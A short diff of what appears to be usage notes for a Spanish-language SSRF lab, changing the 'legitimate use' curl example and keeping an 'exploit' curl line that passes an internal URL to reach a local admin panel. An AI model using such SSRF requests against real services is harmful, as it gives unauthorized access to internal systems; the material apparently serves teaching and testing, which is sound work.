@@ -8,7 +8,7 @@ python ssrf_servicio_interno.py
 python ssrf_app.py
 
 # Uso legítimo
-curl "http://localhost:5000/verificar-stock?servicio=http://127.0.0.1:6000/stock/42"
+curl "http://localhost:5000/verificar-stock?producto_id=42"
 
 # Exploit con destino a panel de administración
 curl "http://localhost:5000/verificar-stock?servicio=http://127.0.0.1:6000/admin/panel"
